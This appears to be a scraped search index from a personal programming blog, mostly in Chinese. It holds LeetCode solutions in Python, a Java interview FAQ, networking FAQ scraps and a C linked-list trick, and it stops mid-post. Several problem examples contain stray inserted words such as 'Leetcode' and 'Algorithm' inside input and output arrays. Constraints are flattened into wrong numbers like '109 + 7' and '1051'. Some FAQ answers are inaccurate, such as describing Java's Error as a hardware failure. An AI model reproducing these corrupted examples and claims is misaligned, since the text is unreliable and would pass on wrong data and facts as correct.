StopIteration LC remove duplicate from the linked list validate binary search tree top k frequen elements reverse linked list cross byte matching 的 pattern search byte: kmp bit: bitmask mutil core process!! atomic cache coherency ","permalink":"https://littlebees.github.io/2021/08/net-faq/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e","title":"net-faq"},{"content":"動機 就dfs傳範圍\nProblem Given a binary tree root, a node X in the tree is named good if in the path from root to X there are no nodes with a value greater than X.\nReturn the number of good nodes in the binary tree.\nExample 1:\nInput: root = [3,1,4,3,Leetcode,1,5]Output: 4Explanation: Nodes in blue are good.Root Node (3) is always a good node.Node 4 -\u003e (3,4) is the maximum value in the path starting from the root.Node 5 -\u003e (3,4,5) is the maximum value in the pathNode 3 -\u003e (3,1,3) is the maximum value in the path.Example 2:\nInput: root = [3,3,null,4,2]Output: 3Explanation: Node 2 -\u003e (3, 3, 2) is not good, because \"3\" is higher than it.Example 3:\nInput: root = [1]Output: 1Explanation: Root is considered as good. Constraints:\nThe number of nodes in the binary tree is in the range [1, 10^5].Each node's value is between [-10^4, 10^4]. Sol class Solution: def goodNodes(self, root: TreeNode,val=float(\u0026#39;-inf\u0026#39;)) -\u0026gt; int: if not root: return 0 elif root.val \u0026gt;= val: return 1+self.goodNodes(root.left,root.val)+self.goodNodes(root.right,root.val) else: return self.goodNodes(root.left,val)+self.goodNodes(root.right,val) ","permalink":"https://littlebees.github.io/2021/08/leetcode-1448-count-good-nodes-in-binary-tree/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e就dfs傳範圍\u003c/p\u003e","title":"leetcode-1448 - Count Good Nodes in Binary Tree"},{"content":"動機 每個數字都會分別在每個是最大最小的seg中擔任最大最小 所以只要把組合數算出來就好\n在你以為要列舉時，直接算組合數\nProblem The width of a sequence is the difference between the maximum and minimum elements in the sequence.\nGiven an array of integers nums, return the sum of the widths of all the non-empty subsequences of nums. Since the answer may be very large, return it modulo 109 + 7.\nA subsequence is a sequence that can be derived from an array by deleting some or no elements without changing the order of the remaining elements. For example, [3,6,2,7] is a subsequence of the array [0,3,1,6,2,2,7].\nExample 1:\nInput: nums = [2,1,3]Output: 6Explanation: The subsequences are [1], [2], [3], [2,1], [2,3], [1,3], [2,1,3].The corresponding widths are 0, 0, 0, 1, 1, 2, 2.The sum of these widths is 6.Example 2:\nInput: nums = [2]Output: 0 Constraints:\n1 \u003c= nums.length \u003c= 1051 \u003c= nums[i] \u003c= 105 Sol class Solution: def sumSubseqWidths(self, nums: List[int]) -\u0026gt; int: ret = 0 for i,n in enumerate(sorted(nums)): ret += n * (1 \u0026lt;\u0026lt; i) # left ret -= n * (1 \u0026lt;\u0026lt; (len(nums)-i-1)) # right return ret % (10**9 + 7) ","permalink":"https://littlebees.github.io/2021/08/leetcode-891-sum-of-subsequence-widths/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e每個數字都會分別在每個是最大最小的seg中擔任最大最小\n所以只要把\u003cem\u003e組合數\u003c/em\u003e算出來就好\u003c/p\u003e\n\u003cp\u003e在你以為要列舉時，直接算組合數\u003c/p\u003e","title":"leetcode-891 - Sum of Subsequence Widths"},{"content":"動機 基本上看到seg與要順序都可以猜用Monotonic Stack 這裡可以直接抄768用\nProblem You are given an integer array arr.\nWe split arr into some number of chunks (i.e., partitions), and individually sort each chunk. After concatenating them, the result should equal the sorted array.\nReturn the largest number of chunks we can make to sort the array.\nExample 1:\nInput: arr = [5,4,3,2,1]Output: 1Explanation:Splitting into two or more chunks will not return the required result.For example, splitting into [5, 4], [3, 2, 1] will result in [4, 5, 1, 2, 3], which isn't sorted.Example 2:\nInput: arr = [2,1,3,4,4]Output: 4Explanation:We can split into two chunks, such as [2, 1], [3, 4, 4].However, splitting into [2, 1], [3], [4], [4] is the highest number of chunks possible. Constraints:\n1 \u003c= arr.length \u003c= 20000 \u003c= arr[i] \u003c= 108 Sol class Solution: def maxChunksToSorted(self, arr: List[int]) -\u0026gt; int: stk = [] for n in arr: maxN = n while stk and stk[-1] \u0026gt; n: maxN = max(maxN, stk.pop()) stk += maxN, return len(stk) ","permalink":"https://littlebees.github.io/2021/08/leetcode-768-max-chunks-to-make-sorted-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e基本上看到seg與要順序都可以猜用Monotonic Stack\n這裡可以直接抄768用\u003c/p\u003e","title":"leetcode-768 - Max Chunks To Make Sorted II"},{"content":"動機 這裡的Monotonic Stack不同於84的用法\nstack放的是sort好的區塊，放上最大值(或是區塊的最後一個)\n或是利用只有0~n-1的特性\nProblem You are given an integer array arr of length n that represents a permutation of the integers in the range [0, n - 1].\nWe split arr into some number of chunks (i.e., partitions), and individually sort each chunk. After concatenating them, the result should equal the sorted array.\nReturn the largest number of chunks we can make to sort the array.\nExample 1:\nInput: arr = [4,3,2,1,0]Output: 1Explanation:Splitting into two or more chunks will not return the required result.For example, splitting into [4, 3], [2, 1, 0] will result in [3, 4, 0, 1, 2], which isn't sorted.Example 2:\nInput: arr = [1,0,2,3,4]Output: 4Explanation:We can split into two chunks, such as [1, 0], [2, 3, 4].However, splitting into [1, 0], [2], [3], [4] is the highest number of chunks possible. Constraints:\nn == arr.length1 \u003c= n \u003c= 100 \u003c= arr[i] \u003c nAll the elements of arr are unique. Sol class Solution: def maxChunksToSorted(self, arr: List[int]) -\u0026gt; int: stk = [] for n in arr: maxN = n while stk and stk[-1] \u0026gt; n: maxN = max(maxN, stk.pop()) stk += maxN, return len(stk) 但這裡可以利用只有0~n-1的特性!! 只要在對的位置上，從0~i之間，一定是最大的\nclass Solution: def maxChunksToSorted(self, arr: List[int]) -\u0026gt; int: curMax, res = -1, 0 for i, v in enumerate(arr): curMax = max(curMax, v) res += curMax == i return res ","permalink":"https://littlebees.github.io/2021/08/leetcode-769-max-chunks-to-make-sorted/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e這裡的Monotonic Stack不同於84的用法\u003c/p\u003e\n\u003cp\u003estack放的是sort好的區塊，放上最大值(或是區塊的最後一個)\u003c/p\u003e\n\u003cp\u003e或是利用只有0~n-1的特性\u003c/p\u003e","title":"leetcode-769 - Max Chunks To Make Sorted"},{"content":"動機 Monotonic Stack在pop時當下的狀態是\n7 3 2 .left. 1 .right. 2 right的數字大小一定是大於1!! left的數字一定是等於1\n代表說在這個區間1一定是最小的 但哪邊是最大? 就要比較左右兩邊了\nProblem Given an array arr of positive integers, consider all binary trees such that:\nEach node has either 0 or 2 children;The values of arr correspond to the values of each leaf in an in-order traversal of the tree.The value of each non-leaf node is equal to the product of the largest leaf value in its left and right subtree, respectively.Among all possible binary trees considered, return the smallest possible sum of the values of each non-leaf node. It is guaranteed this sum fits into a 32-bit integer.\nA node is a leaf if and only if it has zero children.\nExample 1:\nInput: arr = [6,2,4]Output: 32Explanation: There are two possible trees shown.The first has a non-leaf node sum 36, and the second has non-leaf node sum 32.Example 2:\nInput: arr = [4,11]Output: 44 Constraints:\n2 \u003c= arr.length \u003c= 401 \u003c= arr[i] \u003c= 15It is guaranteed that the answer fits into a 32-bit signed integer (i.e., it is less than 231). Sol class Solution: def mctFromLeafValues(self, arr: List[int]) -\u0026gt; int: stk, ret = [], 0 for n in arr: while stk and stk[-1] \u0026lt;= n: minN = stk.pop() if stk: ret += min(stk[-1], n)*minN else: ret += minN*n stk += n, return ret+sum([a*b for a,b in zip(stk[:-1], stk[1:])],0) ","permalink":"https://littlebees.github.io/2021/08/leetcode-1130-minimum-cost-tree-from-leaf-values/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003eMonotonic Stack在pop時當下的狀態是\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e7 3 2 .left. 1 .right. 2\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eright的數字大小一定是大於1!!\nleft的數字一定是等於1\u003c/p\u003e\n\u003cp\u003e代表說在這個區間1一定是最小的\n但哪邊是最大? 就要比較左右兩邊了\u003c/p\u003e","title":"leetcode-1130 - Minimum Cost Tree From Leaf Values"},{"content":"動機 看84\nProblem You are given an array of integers nums (0-indexed) and an integer k.\nThe score of a subarray (i, j) is defined as min(nums[i], nums[i+1], ..., nums[j]) * (j - i + 1). A good subarray is a subarray where i \u003c= k \u003c= j.\nReturn the maximum possible score of a good subarray.\nExample 1:\nInput: nums = [1,4,3,7,4,5], k = 3Output: 15Explanation: The optimal subarray is (1, 5) with a score of min(4,3,7,4,5) * (5-1+1) = 3 * 5 = 15. Example 2:\nInput: nums = [5,5,4,5,4,1,1,1], k = 0Output: 20Explanation: The optimal subarray is (0, 4) with a score of min(5,5,4,5,4) * (4-0+1) = 4 * 5 = 20. Constraints:\n1 \u003c= nums.length \u003c= 1051 \u003c= nums[i] \u003c= 2 * 1040 \u003c= k \u003c nums.length Sol 在區間對的時候才更新答案\nclass Solution: def maximumScore(self, nums: List[int], k: int) -\u0026gt; int: stk = [] ret = 0 for i,n in enumerate(nums+[0]): while stk and nums[stk[-1]] \u0026gt;= n: j = stk.pop() if stk and stk[-1]\u0026lt;k\u0026lt;i: ret = max(ret, nums[j]*(i-stk[-1]-1)) elif not stk and k\u0026lt;i: ret = max(ret, nums[j]*i) stk += i, return ret ","permalink":"https://littlebees.github.io/2021/08/leetcode-1793-maximum-score-of-a-good-subarray/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e看\u003ca href=\"/2021/07/leetcode-84\"\u003e84\u003c/a\u003e\u003c/p\u003e","title":"leetcode-1793 - Maximum Score of a Good Subarray"},{"content":"動機 把84的monotonic stack介紹借過來一下\n1 2 3 .left. 7 .right. 2 right的數字大小一定是大於7!! left的數字一定是等於7\n所以在這個區間中7一定是最小\n這樣就可以用在題\nProblem The min-product of an array is equal to the minimum value in the array multiplied by the array's sum.\nFor example, the array [3,2,5] (minimum value is 2) has a min-product of 2 * (3+2+5) = 2 * 10 = 20.Given an array of integers nums, return the maximum min-product of any non-empty subarray of nums. Since the answer may be large, return it modulo 109 + 7.\nNote that the min-product should be maximized before performing the modulo operation. Testcases are generated such that the maximum min-product without modulo will fit in a 64-bit signed integer.\nA subarray is a contiguous part of an array.\nExample 1:\nInput: nums = [1,2,3,2]Output: 14Explanation: The maximum min-product is achieved with the subarray [2,3,2] (minimum value is 2).2 * (2+3+2) = 2 * 7 = 14.Example 2:\nInput: nums = [2,3,3,1,2]Output: 18Explanation: The maximum min-product is achieved with the subarray [3,3] (minimum value is 3).3 * (3+3) = 3 * 6 = 18.Example 3:\nInput: nums = [3,1,5,6,4,2]Output: 60Explanation: The maximum min-product is achieved with the subarray [5,6,4] (minimum value is 4).4 * (5+6+4) = 4 * 15 = 60. Constraints:\n1 \u003c= nums.length \u003c= 1051 \u003c= nums[i] \u003c= 107 Sol class Solution: def maxSumMinProduct(self, nums: List[int]) -\u0026gt; int: sums = list(accumulate(nums, initial=0)) nums += 0, # to compute last part autoly stk = [] ret = 0 for i,n in enumerate(nums): while stk and nums[stk[-1]] \u0026gt;= n: j = stk.pop() if stk: ret = max(ret, nums[j]*(sums[i]-sums[stk[-1]+1])) else: ret = max(ret, nums[j]*sums[i]) stk += i, return ret % (10**9 + 7) ","permalink":"https://littlebees.github.io/2021/08/leetcode-1856-maximum-subarray-min-product/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e把\u003ca href=\"/2021/07/leetcode-84\"\u003e84\u003c/a\u003e的monotonic stack介紹借過來一下\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003e1 2 3 .left. 7 .right. 2\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003eright的數字大小一定是大於7!!\nleft的數字一定是等於7\u003c/p\u003e\n\u003cp\u003e所以在這個區間中7一定是最小\u003c/p\u003e\n\u003cp\u003e這樣就可以用在題\u003c/p\u003e","title":"leetcode-1856 - Maximum Subarray Min-Product"},{"content":"動機 沒有魔法的一題\n但要怎麼看出沒有魔法?\nProblem You are given two integer arrays nums1 and nums2 of lengths m and n respectively. nums1 and nums2 represent the digits of two numbers. You are also given an integer k.\nCreate the maximum number of length k \u003c= m + n from digits of the two numbers. The relative order of the digits from the same array must be preserved.\nReturn an array of the k digits representing the answer.\nExample 1:\nInput: nums1 = [3,4,6,5], nums2 = [9,1,2,5,8,3], k = 5Output: [9,8,6,5,3]Example 2:\nInput: nums1 = [6,7], nums2 = [6,0,4], k = 5Output: [6,7,6,0,4]Example 3:\nInput: nums1 = [3,9], nums2 = [8,9], k = 3Output: [9,8,9] Constraints:\nm == nums1.lengthn == nums2.length1 \u003c= m, n \u003c= 5000 \u003c= nums1[i], nums2[i] \u003c= 91 \u003c= k \u003c= m + n Sol 如果只是要字典序最大，用monotonic stack就好\n接著就是merge，要看字典序大小去merge\n最後就是try所有組合\nclass Solution: def maxNumber(self, nums1: List[int], nums2: List[int], k: int) -\u0026gt; List[int]: def maxList(ns, drop): ret = [] for n in ns: while drop \u0026gt; 0 and ret and ret[-1] \u0026lt; n: ret.pop() drop -= 1 ret.append(n) return ret def merge(nums1, nums2): ans = [] while nums1 or nums2: if nums1 \u0026gt; nums2: ans += [nums1[0]] nums1 = nums1[1:] else: ans += [nums2[0]] nums2 = nums2[1:] return ans ret = [] for i in range(k): a,b = len(nums1)-i, len(nums2)-(k-i) if a \u0026gt;= 0 and b \u0026gt;= 0: ret = max(ret, merge(maxList(nums1,a),maxList(nums2,b))[:k]) return ret ","permalink":"https://littlebees.github.io/2021/08/leetcode-321-create-maximum-number/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e沒有魔法的一題\u003c/p\u003e\n\u003cp\u003e但要怎麼看出沒有魔法?\u003c/p\u003e","title":"leetcode-321 - Create Maximum Number"},{"content":"動機 保持原本的順序，維持字典序(小於等於) Monotonic Stack\nProblem Given a string s, remove duplicate letters so that every letter appears once and only once. You must make sure your result is the smallest in lexicographical order among all possible results.\nExample 1:\nInput: s = \"bcabc\"Output: \"abc\"Example 2:\nInput: s = \"cbacdcbc\"Output: \"acdb\" Constraints:\n1 \u003c= s.length \u003c= 104s consists of lowercase English letters. Note: This question is the same as 1081: https://leetcode.com/problems/smallest-subsequence-of-distinct-characters/\nSol Monotonic Stack要用但是有一個限制，只能移除多的字元，所以要移除時要看後面還有沒有其他機會\nclass Solution: def removeDuplicateLetters(self, s: str) -\u0026gt; str: cnts = Counter(s) # 還有幾次可以選 stk = [] for c in s: cnts[c] -= 1 if c not in stk: while stk and stk[-1] \u0026gt;= c and cnts[stk[-1]] \u0026gt; 0: stk.pop() stk += c, return \u0026#39;\u0026#39;.join(stk) ","permalink":"https://littlebees.github.io/2021/08/leetcode-316-remove-duplicate-letters/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e保持原本的順序，維持字典序(小於等於)\nMonotonic Stack\u003c/p\u003e","title":"leetcode-316 - Remove Duplicate Letters"},{"content":"動機 連續、小於等於最後一個值 就是用Monotonic Stack\nProblem Design an algorithm that collects daily price quotes for some stock and returns the span of that stock's price for the current day.\nThe span of the stock's price today is defined as the maximum number of consecutive days (starting from today and going backward) for which the stock price was less than or equal to today's price.\nFor example, if the price of a stock over the next 7 days were [100,80,60,70,60,75,85], then the stock spans would be [1,1,1,2,1,4,6].Implement the StockSpanner class:\nStockSpanner() Initializes the object of the class.int next(int price) Returns the span of the stock's price given that today's price is price. Example 1:\nInput[\"StockSpanner\", \"next\", \"next\", \"next\", \"next\", \"next\", \"next\", \"next\"][[], [100], [80], [60], [70], [60], [75], [85]]Output[Algorithm, Leetcode, 1, 1, 1, 2, 1, 4, 6]ExplanationStockSpanner stockSpanner = new StockSpanner();stockSpanner.next(100); // return 1stockSpanner.next(80); // return 1stockSpanner.next(60); // return 1stockSpanner.next(70); // return 2stockSpanner.next(60); // return 1stockSpanner.next(75); // return 4, because the last 4 prices (including today's price of 75) were less than or equal to today's price.stockSpanner.next(85); // return 6 Constraints:\n1 \u003c= price \u003c= 105At most 104 calls will be made to next. Sol 這是紀錄區間長度，，stack放(goal index, len)\nclass StockSpanner: def __init__(self): self.stk = [] # (now smallest price, bigger than this price cnt) def next(self, price: int) -\u0026gt; int: cnt = 1 while self.stk and self.stk[-1][0] \u0026lt;= price: # 紀錄seg最大值 cnt += self.stk.pop()[1] self.stk += [price, cnt], return cnt ","permalink":"https://littlebees.github.io/2021/08/leetcode-901-online-stock-span/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e連續、小於等於最後一個值\n就是用Monotonic Stack\u003c/p\u003e","title":"leetcode-901 - Online Stock Span"},{"content":"動機 Monotonic Stack其中一個功能就是在pop的時候可以知道下一個最大\nProblem Given a circular integer array nums (i.e., the next element of nums[nums.length - 1] is nums[0]), return the next greater number for every element in nums.\nThe next greater number of a number x is the first greater number to its traversing-order next in the array, which means you could search circularly to find its next greater number. If it doesn't exist, return -1 for this number.\nExample 1:\nInput: nums = [1,2,1]Output: [2,-1,2]Explanation: The first 1's next greater number is 2; The number 2 can't find next greater number. The second 1's next greater number needs to search circularly, which is also 2.Example 2:\nInput: nums = [1,2,3,4,3]Output: [2,3,4,-1,4] Constraints:\n1 \u003c= nums.length \u003c= 104-109 \u003c= nums[i] \u003c= 109 Sol circular? 長度兩倍就好\nclass Solution: def nextGreaterElements(self, nums: List[int]) -\u0026gt; List[int]: stk = [] ret = [] nums += nums for i,n in enumerate(nums): while stk and nums[stk[-1]] \u0026lt; n: ret[stk.pop()] = n stk += i, ret += -1, return ret[:len(nums)//2] ","permalink":"https://littlebees.github.io/2021/08/leetcode-503-next-greater-element-ii/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003eMonotonic Stack其中一個功能就是在pop的時候可以知道下一個最大\u003c/p\u003e","title":"leetcode-503 - Next Greater Element II"},{"content":"動機 用stack去計分數，另外solution的解法很神\nProblem Given a balanced parentheses string s, return the score of the string.\nThe score of a balanced parentheses string is based on the following rule:\n\"()\" has score 1.AB has score A + B, where A and B are balanced parentheses strings.(A) has score 2 * A, where A is a balanced parentheses string. Example 1:\nInput: s = \"()\"Output: 1Example 2:\nInput: s = \"(())\"Output: 2Example 3:\nInput: s = \"()()\"Output: 2Example 4:\nInput: s = \"(()(()))\"Output: 6 Constraints:\n2 \u003c= s.length \u003c= 50s consists of only '(' and ')'.s is a balanced parentheses string. Sol stack放左括號與當前分數，只要遇到分數就是乘2\nclass Solution: def scoreOfParentheses(self, s: str) -\u0026gt; int: stk = [] for c in s: if c == \u0026#34;(\u0026#34;: stk += c, elif stk[-1] == \u0026#34;(\u0026#34;: stk.pop() stk += 1, else: ret = 0 while stk and stk[-1] != \u0026#34;(\u0026#34;: ret += stk.pop() stk[-1] = ret*2 return sum(stk, 0) trace括號的深度，在有()時就直接加2^dep\nclass Solution(object): def scoreOfParentheses(self, S): ans = bal = 0 for i, x in enumerate(S): if x == \u0026#39;(\u0026#39;: bal += 1 else: bal -= 1 if S[i-1] == \u0026#39;(\u0026#39;: ans += 1 \u0026lt;\u0026lt; bal return ans ","permalink":"https://littlebees.github.io/2021/08/leetcode-856-score-of-parentheses/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e用stack去計分數，另外solution的解法很神\u003c/p\u003e","title":"leetcode-856 - Score of Parentheses"},{"content":"動機 把不要的扣掉!!\nProblem Given the root of a binary tree, split the binary tree into two subtrees by removing one edge such that the product of the sums of the subtrees is maximized.\nReturn the maximum product of the sums of the two subtrees. Since the answer may be too large, return it modulo 109 + 7.\nNote that you need to maximize the answer before taking the mod and not after taking it.\nExample 1:\nInput: root = [1,2,3,4,5,6]Output: 110Explanation: Remove the red edge and get 2 binary trees with sum 11 and 10. Their product is 110 (11*10)Example 2:\nInput: root = [1,Leetcode,2,3,4,null,null,5,6]Output: 90Explanation: Remove the red edge and get 2 binary trees with sum 15 and 6.Their product is 90 (15*6)Example 3:\nInput: root = [2,3,9,10,7,8,6,5,4,11,1]Output: 1025Example 4:\nInput: root = [1,1]Output: 1 Constraints:\nThe number of nodes in the tree is in the range [2, 5 * 104].1 \u003c= Node.val \u003c= 104 Sol class Solution: def maxProduct(self, root: Optional[TreeNode]) -\u0026gt; int: ans = 0 def dfs(r,cb): if not r: return 0 else: left = dfs(r.left,cb) right = dfs(r.right,cb) cb(left,right) return r.val+left+right total = dfs(root, lambda a,b: None) def cb(a,b): nonlocal ans ans = max(ans, (total-a)*a, (total-b)*b) dfs(root,cb) return ans % (10**9 + 7) ","permalink":"https://littlebees.github.io/2021/08/leetcode-1339-maximum-product-of-splitted-binary-tree/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e把不要的扣掉!!\u003c/p\u003e","title":"leetcode-1339 - Maximum Product of Splitted Binary Tree"},{"content":"動機 就faq\nOO 物件導向的特徵 封裝 多型 繼承 Overload和Override差在 Overload是同class同名的method但有不同的signatrue Override child class把同名同signatrue的method蓋掉 equals()與== equals是比值 因為他是method可以被蓋所以可以比值 所以要一起改hashcode ==是比記憶體位置 這是operator不能override只能照設定的來 两个对象的 hashCode()相同，则 equals()也一定为 true，对吗？ String str1 = \u0026#34;通话\u0026#34;; String str2 = \u0026#34;重地\u0026#34;; System.out.println(String.format(\u0026#34;str1：%d | str2：%d\u0026#34;, str1.hashCode(),str2.hashCode())); System.out.println(str1.equals(str2)); Private, Public, Protected private: class scope protected: inherence scope public: whatever default (無修飾元): file(package) scope java type primitive byte int short short a; a+=1; a = (short) (a+1) char long float 1.1F double 1.1 boolean Object (有人叫他引用type) int與Integer差在 一個是primitive一個是Object 大小，使用方式都不一樣 String與StringBuffer差在 String不可改動，每次+都是生新的String StringBuffer可以改，像c的char[] Exception與Runtime Exception與Error差在 Exception會被宣告在method signatrue(throws) 一定要被catch，compiler會檢查 Runtime Exception就是一般的例外 丟了會stack trace back 沒人接就壞掉 Error是硬體出事了，當他出現時世界就毀滅了 ArrayList,Vector, LinkedList差在 LinkedList就是linkedlist，但是是雙向 ArrayList就是C++的vector Vector就是有synchronized的ArrayList 但現在都用Concurrent開頭的 HashMap和Hashtable差在 HashMap不是thread safe，能放null Hashtable有synchronized final, finally, finalize差在 final 這欄位不可變、不可繼承、不可override final的instant variable沒有default value finally不論有沒有例外，總是執行 就算try裡面有放return也會跑!! finalize被GC會被call的method 現在用cleaner!! compareTo() vs equals() in String compareTo就是一般比較的函數，ruby的\u0026lt;=\u0026gt; equals只有boolean interface default \u0026amp; static method default用在不用實做某些method的時候 (變得像abstrac class) 可以延伸到abstract class與interface的差異 abstract class不一定要實作所有abstract，interface要 abstract class的method可以access attribute，interface只有常數 static method就是跟著interface的method，Iface.method() Anonymous Inner Class 很像clousre，可以直接new interface接要override的method 所以也沒辦法直接extend，implements public class AnonymousInnerClass { public static void main(String[] args) { // Ex. Anonymous Inner Class new Thread() { @Override public void run() { // code... System.out.println(\u0026#34;Anonymous Inner Class\u0026#34;); } }.start(); } } Collection與Collections差在 Collection是interface，要實作add與remove與toarray Collections是對Collection操作的方法，像C++的algorithm List、Set、Map 是否繼承自 Collection 介面 List與Set是 Map不是，是AbstractMap sleep \u0026amp; wait sleep是thread睡覺，要時間到才會自己跑，不會放棄鎖 wait是針對monitor的工作，可以讓自己睡，或是收別人的signal，會放棄鎖 啟動一個線程是用 run() 還是 start() start之後會invoke run跑需要的code 當一個線程進入一個物件的一個 Synchronized 方法後，其它線程是否可以進入此物件的其他方法？ 要看是不是吃同一個obj 如果是一般method，就沒辦法進去 static method會吃class做為鎖，就可以進去 java的記憶體 for runtime stack heap method area const pool code static 1/0 \u0026amp; 1/1.0 1/0: ArithmeticException 1/1.0: Infinite (沒有例外) constructor是否可被override? 不行，可以overload jvm怎麼載入class ClassLoader會根據繼承關係把class，讀進來會驗證、allocate mem、link、init static資料、生成物件讓jvm跑 從來沒有人說過Java的Class名字必須和其檔名相同。但public class的名字必須和檔名相同 // OtherThing.java class Something { private static void main(String[] something_to_do) { System.out.println(\u0026#34;Do something ...\u0026#34;); } } Math.round(-1.5) -1 Thread state start ready running blocked destroied 如何deepcopy Cloneable Serializable Inversion of Control 原本是Logic去控制資料 有些資料其實是一起的，所以可以根據我們這邊的需求去生 但也可以讓外面給 (Dependency Injection) 透過setter 透過interface (我們只call method) 透過constructor 再跑logic之前讓資料就定位 之後就是有一堆framework，想描述(變成像prolog那樣)給參數這行為就有了這個詞 這到最後可以不管程式實作了!! 它本身就是程式阿 Servlet cgi與servlet差在 cgi是每次req都fork一個process去處理，之後回到parent servlet是會初始化只後一直處理req，等server不要時再回收 AOP 有些與logic無關的code但要與logic放在一起的code(log)，Aspect 如果想分開就是要留callback的點，Joinpoint B+ tree 每一個node代表一個range，下面的ptr指到符合範圍的node design pattern 把object當成lambda就可以處理很多問題\n之後就是用\ninterface 繼承 包成object 去傳需要的邏輯 剩下就visitor是pattern match\ndesign pattern隨便筆記\n正規化 讓table好join\n把array轉90度 讓整個主鍵可以filter出所有欄目 (course ID, student ID去濾可以找出grade與student name，name要被割出去) 割出去的項目只能用主鍵去濾資料 note\nGC 每個obj都是一個node，所以每個都有\nindegree 當indegree為0就被回收 如果有loop就不會被回收 edge 從root做traversal，有走到就是ok 會產生記憶體斷片、物件多會跑很久(stop the world) 物件多會跑很久: 區分世代使用不同algo 產生記憶體斷片: 一次只用整條記憶體的一半，要換時就把剩下都copy去另一邊 ","permalink":"https://littlebees.github.io/2021/08/java%E7%9A%84faq/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e就faq\u003c/p\u003e","title":"java的faq"},{"content":"動機 Linus Torvalds的雙層ptr的推廣文\n原本刪node的方式 ptr指到node，所以要記錄prev，因為不知道下一個是誰，還要處理在head刪的問題\ndef delNode(head, target): prev, cur = None, head while cur: if cur is target: if prev: prev.next = cur.next else: return cur.next return head 用雙層ptr 現在我們看next本身!!\nnext本身有\n自己的node下一步到哪 下一個node的位置 所以只要看到下一個node是target就可以直接改next!!\nNode* delNode(Node* head, Node* target) { Node** next = \u0026amp;(head-\u0026gt;next); for (;*next \u0026amp;\u0026amp; *next != target; next = \u0026amp;(*next)-\u0026gt;next) ; // 當跳出去時一個是到底，一個是下一個是target if (*next) *next = target-\u0026gt;next; // 直接改next的內容 } Ref Linked lists, pointer tricks and good taste\n","permalink":"https://littlebees.github.io/2021/08/%E5%88%AAlinked-list%E7%9A%84%E5%A5%BD%E5%81%9A%E6%B3%95/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003eLinus Torvalds的雙層ptr的推廣文\u003c/p\u003e","title":"刪linked list的好做法??"},{"content":"動機 之前有一題就是用左右兩邊的長度相乘算組合數，不過這題還要快速求出左右兩邊，所以就用了monotone stack\nmonotone stack有兩個用途\nprevious less element next less element 詳細看這篇\nProblem Given an array of integers arr, find the sum of min(b), where b ranges over every (contiguous) subarray of arr. Since the answer may be large, return the answer modulo 109 + 7.\nExample 1:\nInput: arr = [3,1,2,4]Output: 17Explanation: Subarrays are [3], [1], [2], [4], [3,1], [1,2], [2,4], [3,1,2], [1,2,4], [3,1,2,4]. Minimums are 3, 1, 2, 4, 1, 1, 2, 1, 1, 1.Sum is 17.Example 2:\nInput: arr = [11,81,94,43,3]Output: 444 Constraints:\n1 \u003c= arr.length \u003c= 3 * 1041 \u003c= arr[i] \u003c= 3 * 104 Sol 出左右兩邊，再一次組合起來\nclass Solution: def sumSubarrayMins(self, arr: List[int]) -\u0026gt; int: left = [] stk = [] for i in range(len(arr)): count = 1 while stk and stk[-1][0] \u0026gt; arr[i]: num, cnt = stk.pop() count += cnt left.append(count) stk.append([arr[i],count]) right = [] stk = [] for i in reversed(range(len(arr))): count = 1 while stk and stk[-1][0] \u0026gt;= arr[i]: num, cnt = stk.pop() count += cnt right.append(count) stk.append([arr[i],count]) return sum([l*a*r for l,a,r in zip(left,arr,right[::-1])]) % (10**9 + 7) 再整理stack時，可以直接算!! 因為stack下一個index就是左，現在比較大的就是右\n不過要處理邊界問題，這裡用[0]+A+[0] 很神奇!!\nclass Solution: def sumSubarrayMins(self, A): res = 0 s = [] for i, x in enumerate(A): while s and A[s[-1]] \u0026gt; x: j = s.pop() k = s[-1] if s else -1 res += A[j] * (i - j) * (j - k) s.append(i) return res % (10**9 + 7) ","permalink":"https://littlebees.github.io/2021/08/leetcode-907-sum-of-subarray-minimums/","summary":"\u003ch2 id=\"動機\"\u003e動機\u003c/h2\u003e\n\u003cp\u003e之前有一題就是用左右兩邊的長度相乘算組合數，不過這題還要快速求出左右兩邊，所以就用了monotone stack\u003c/p\u003e\n\u003cp\u003emonotone stack有兩個用途\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eprevious less element\u003c/li\u003e\n\u003cli\u003enext less element\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003e\u003ca href=\"https://leetcode.com/problems/sum-of-subarray-minimums/discuss/178876/stack-solution-with-very-detailed-explanation-step-by-step\"\u003e詳細看這篇\u003c/a\u003e\u003c/p\u003e","title":"leetcode-907 - Sum of Subarray Minimums"},{"content":"動機 超有意思的題目，只能用bottomup dp的題目!! 下次不能說topdown與bottomup的dp可以互換了\ntopdown dp與bottomup dp差在一個在前半段處理，另一個在後半段 因為上面的特質導致這題只能用bottomup\nProblem Given two integer arrays nums1 and nums2, return the maximum length of a subarray that appears in both arrays.\nExample 1:\nInput: nums1 = [1,2,3,2,1], nums2 = [3,2,1,4,7]Output: 3Explanation: The repeated subarray with maximum length is 